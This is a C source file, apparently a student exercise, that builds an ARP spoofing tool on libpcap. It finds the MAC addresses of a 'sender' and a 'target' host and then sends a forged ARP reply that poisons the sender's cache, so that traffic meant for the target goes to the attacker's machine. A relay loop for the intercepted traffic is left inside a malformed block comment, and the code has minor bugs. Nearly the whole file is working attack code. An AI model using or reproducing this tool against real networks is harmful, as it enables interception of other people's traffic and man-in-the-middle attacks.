// Developer: ming
// platform: Ubuntu 16.04.2
// Reference : http://www.binarytides.com/c-program-to-get-ip-address-from-interface-name-on-linux/
// Reference : http://www.programming-pcap.aldabaknocking.com/code/arpsniffer.c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h> // ifreq
#include <unistd.h> // close
#include <arpa/inet.h>
#include <pcap.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <pthread.h>
#include <netinet/ip.h>

/* ARP Header, (assuming Ethernet+IPv4)                   */ 
#define ETHERNET 1
#define ARP_REQUEST 1          /* ARP Request             */ 
#define ARP_REPLY 2            /* ARP Reply               */ 
#define PACKET_SIZE 42	       /* Packet Size	 	  */
#define ETHER_HLEN 14	       /* ethernet header size    */
typedef struct arpheader { 
    uint16_t htype;            /* Hardware Type           */ 
    uint16_t ptype;            /* Protocol Type           */ 
    uint8_t hlen;              /* Hardware Address Length */ 
    uint8_t plen;      	       /* Protocol Address Length */ 
    uint16_t oper;	       /* Operation Code          */ 
    uint8_t sha[6];            /* Sender hardware address */ 
    uint32_t spa;              /* Sender IP address       */ 
    uint8_t tha[6];            /* Target hardware address */ 
    uint32_t tpa;              /* Target IP address       */ 
} __attribute__((packed)) arphdr_t; 

void *t_function(void *data)
{
	pid_t pid;            // process id
	pthread_t tid;        // thread id

	pid = getpid();
	tid = pthread_self();

	char* thread_name = (char*)data;
	int i = 0;
 	printf("thread\n");
	
}

int main(int argc, char *argv[])
{
	int fd;
	struct ifreq ifr;
	unsigned char attacker_mac[6];
	const char *attacker_ip;
	char *dev, *sender_ip, *target_ip;
	
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	int res;
	struct pcap_pkthdr *header;
	const u_char *reply_packet;

	struct ether_header *ethhdr;
	char packet[100];
	char infect[100];
	char relay[100];

	arphdr_t *arpheader = NULL;

	struct ether_header *reply_eth;
	arphdr_t *reply_arp;
	struct ip *reply_ip;
	struct ip *iphdr;
	unsigned char sender_mac[6]; 
	unsigned char target_mac[6];

	if (argc != 4) {
		printf("input needed: <dev> <sender_ip> <target_ip> \n");
		exit(1);
	}

	dev = argv[1];
	sender_ip = argv[2];
	target_ip = argv[3];

	printf("============= Send ARP =============\n");

	printf("******* get attacker's info *******\n");
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd < 0) perror("socket fail");

	/* Copy the interface name in the ifreq structure */
	strncpy(ifr.ifr_name , dev , IFNAMSIZ-1);
	if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) perror("ioctl fail");

	memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6);

	printf("attacker MAC %x:%x:%x:%x:%x:%x \n", attacker_mac[0], attacker_mac[1], attacker_mac[2], attacker_mac[3], attacker_mac[4], attacker_mac[5]); 	 
	
	/* Get ip address */
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	attacker_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
	printf("attacker IP  %s\n",attacker_ip);

	/* Open network device for packet capture */ 
	if((handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf))==NULL) {
		printf("Couldn't open device %s : %s\n", dev, errbuf);
		return 2;
	}

	printf("******** get target's info ********\n");

	/* Make Ethernet packet */
	ethhdr = (struct ether_header *)packet;
	ethhdr->ether_type = ntohs(ETHERTYPE_ARP);
	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_dhost[i] = '\xff';
	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_shost[i] = attacker_mac[i];
	
	/* Make ARP packet */
	arpheader = (struct arpheader *)(packet+14);
	arpheader->htype = ntohs(ETHERNET);
	arpheader->ptype = ntohs(ETHERTYPE_IP);
	arpheader->hlen = sizeof(arpheader->sha); 
	arpheader->plen = sizeof(arpheader->spa);
	arpheader->oper = ntohs(ARP_REQUEST);
	memcpy(arpheader->sha, attacker_mac, 6);
	arpheader->spa = inet_addr(attacker_ip);
	memcpy(arpheader->tha, "\x00\x00\x00\x00\x00\x00",6);
	arpheader->tpa = inet_addr(target_ip);

	/* Send ARP request */
	pcap_sendpacket(handle, packet, PACKET_SIZE);	
	/* int pcap_sendpacket(pcap_t *p, const u_char *buf, int size);
	 * sends a raw packet through the network interface.
	 * returns 0 on success and -1 on failure.
	 * If -1 is returned, pcap_geterr() or pcap_perror() may be called 
	 * with p as an argument to fetch or display the error text.
	 */

	/* Get ARP reply */
	while(1) {
		res = pcap_next_ex(handle, &header, &reply_packet);
		if(res < 0) exit(1);
		else if(res == 0) {
			if(pcap_sendpacket(handle, packet, PACKET_SIZE)) {
                		exit(1);
           		}
			continue;
		}

		reply_eth = (struct ether_header *)reply_packet;
		if(reply_eth->ether_type != htons(ETHERTYPE_ARP)) continue;
		
		reply_arp = (struct arphdr_t *)(reply_packet + ETHER_HLEN);
		if(reply_arp->ptype != htons(ETHERTYPE_IP)) continue;
		if(reply_arp->oper != htons(ARP_REPLY)) continue;
		if(reply_arp->spa != arpheader->tpa) continue;
		memcpy(target_mac, reply_arp->sha, 6);
		break;
	}

	printf("target MAC   %x:%x:%x:%x:%x:%x \n", target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]); 
	printf("target IP    %s\n", target_ip);

	printf("******** get sender's info ********\n");

	/* Make Ethernet packet */
	ethhdr = (struct ether_header *)packet;
	ethhdr->ether_type = ntohs(ETHERTYPE_ARP);
	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_dhost[i] = '\xff';
	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_shost[i] = attacker_mac[i];
	
	/* Make ARP packet */
	arpheader = (struct arpheader *)(packet+14);
	arpheader->htype = ntohs(ETHERNET);
	arpheader->ptype = ntohs(ETHERTYPE_IP);
	arpheader->hlen = sizeof(arpheader->sha); 
	arpheader->plen = sizeof(arpheader->spa);
	arpheader->oper = ntohs(ARP_REQUEST);
	memcpy(arpheader->sha, attacker_mac, 6);
	arpheader->spa = inet_addr(attacker_ip);
	memcpy(arpheader->tha, "\x00\x00\x00\x00\x00\x00",6);
	arpheader->tpa = inet_addr(sender_ip);

	/* Send ARP request */
	pcap_sendpacket(handle, packet, PACKET_SIZE);	

	/* Get ARP reply */
	while(1) {
		res = pcap_next_ex(handle, &header, &reply_packet);
		if(res < 0) exit(1);
		else if(res == 0) {
			if(pcap_sendpacket(handle, packet, PACKET_SIZE)) {
                		exit(1);
           		}
			continue;
		}

		reply_eth = (struct ether_header *)reply_packet;
		if(reply_eth->ether_type != htons(ETHERTYPE_ARP)) continue;
		
		reply_arp = (struct arphdr_t *)(reply_packet + ETHER_HLEN);
		if(reply_arp->ptype != htons(ETHERTYPE_IP)) continue;
		if(reply_arp->oper != htons(ARP_REPLY)) continue;
		if(reply_arp->spa != arpheader->tpa) continue;
		memcpy(sender_mac, reply_arp->sha, 6);
		break;
	}

	printf("sender MAC   %x:%x:%x:%x:%x:%x \n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]); 
	printf("sender IP    %s\n", sender_ip);

	/* Make Ethernet packet */
	ethhdr = (struct ether_header *)infect;
	ethhdr->ether_type = ntohs(ETHERTYPE_ARP);
	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_dhost[i] = sender_mac[i];
	for(int i=0;i<ETH_ALEN;i++) ethhdr->ether_shost[i] = attacker_mac[i];
	
	/* Make ARP packet */
	arpheader = (struct arpheader *)(infect+14);
	arpheader->htype = ntohs(ETHERNET);
	arpheader->ptype = ntohs(ETHERTYPE_IP);
	arpheader->hlen = sizeof(arpheader->sha); 
	arpheader->plen = sizeof(arpheader->spa);
	arpheader->oper = ntohs(ARP_REPLY);
	memcpy(arpheader->sha, attacker_mac, 6);
	arpheader->spa = inet_addr(target_ip);
	memcpy(arpheader->tha, sender_mac,6);
	arpheader->tpa = inet_addr(sender_ip);

	/* Send ARP reply */
	printf("****** send infected packet *******\n");
	printf("src MAC      %x:%x:%x:%x:%x:%x \n", arpheader->sha[0], arpheader->sha[1], arpheader->sha[2], arpheader->sha[3], arpheader->sha[4], arpheader->sha[5]);
	printf("src IP       %s\n", target_ip);
	printf("dst MAC      %x:%x:%x:%x:%x:%x \n", arpheader->tha[0], arpheader->tha[1], arpheader->tha[2], arpheader->tha[3], arpheader->tha[4], arpheader->tha[5]);
	printf("dst IP       %s\n", sender_ip);
	
	pcap_sendpacket(handle, infect, PACKET_SIZE);			

	/* Get spoofed packet 
	while(1) {
		res = pcap_next_ex(handle, &header, &reply_packet);
		if(res < 0) exit(1);
	
		reply_eth = (struct ether_header *)reply_packet;
		if(reply_eth->ether_type != htons(ETHERTYPE_IP)) continue;
		
		reply_ip = (struct ip *)(reply_packet + sizeof(struct ether_header));
		if(inet_ntoa(reply_ip->ip_dst) == target_ip) {
			/* from sender to target packet 
			for(int i=0;i<ETH_ALEN;i++) reply_eth->ether_dhost[i] = target_mac[i];
			for(int i=0;i<ETH_ALEN;i++) reply_eth->ether_shost[i] = attacker_mac[i];			
		
			pcap_sendpacket(handle, reply_packet, sizeof(reply_packet));	
		}
		else if(inet_ntoa(reply_ip->ip_dst) == sender_ip) {
			/* from target to sender packet 
			for(int i=0;i<ETH_ALEN;i++) reply_eth->ether_dhost[i] = sender_mac[i];
			for(int i=0;i<ETH_ALEN;i++) reply_eth->ether_shost[i] = attacker_mac[i];			
		
			pcap_sendpacket(handle, reply_packet, sizeof(reply_packet));	
		}
		
		pcap_sendpacket(handle, infect, PACKET_SIZE);
	
		break;
	}

	/* Close handle */
	pcap_close(handle);

	printf("====================================\n");
	
	return 0;
}
